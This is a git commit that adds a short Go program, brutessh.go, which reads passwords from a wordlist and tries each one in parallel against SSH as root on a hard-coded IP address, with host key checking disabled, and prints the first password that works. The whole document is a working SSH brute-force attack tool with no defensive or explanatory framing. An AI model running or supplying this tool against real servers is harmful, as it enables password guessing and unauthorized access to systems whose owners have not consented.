6a5deee57376bc90f6d2913a2248d10e6df6497b
x7rslt <1660019216@qq.com>
2021-04-05 21:32:50 +0800

    brute_ssh

---
+++ brute_ssh/brutessh.go
@@ -0,0 +1,58 @@
+package main
+
+import (
+	"bufio"
+	"fmt"
+	"os"
+
+	"golang.org/x/crypto/ssh"
+)
+
+func testSSHAUTH(ip, username, password string, doneChannel chan bool) {
+	sshConfig := &ssh.ClientConfig{
+		User: username,
+		Auth: []ssh.AuthMethod{
+			ssh.Password(password),
+		},
+		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
+	}
+	_, err := ssh.Dial("tcp", ip, sshConfig)
+	if err != nil {
+		fmt.Println("SSH connect error:", err)
+	} else {
+		fmt.Println("SSH connect success:", username, password)
+		os.Exit(0)
+	}
+	doneChannel <- true
+}
+
+func main() {
+	ip := "114.116.230.93:22"
+	username := "root"
+	passwordfile, err := os.Open("wordlist")
+	if err != nil {
+		fmt.Println("Password file open error:", err)
+	}
+	scanner := bufio.NewScanner(passwordfile)
+
+	doneChannel := make(chan bool)
+	actThreads := 0
+	maxThreads := 10
+	for scanner.Scan() {
+		actThreads++
+
+		password := scanner.Text()
+		go testSSHAUTH(ip, username, password, doneChannel)
+
+		if actThreads >= maxThreads {
+			<-doneChannel
+			actThreads--
+		}
+	}
+	for actThreads > 0 {
+		<-doneChannel
+		actThreads--
+
+	}
+
+}
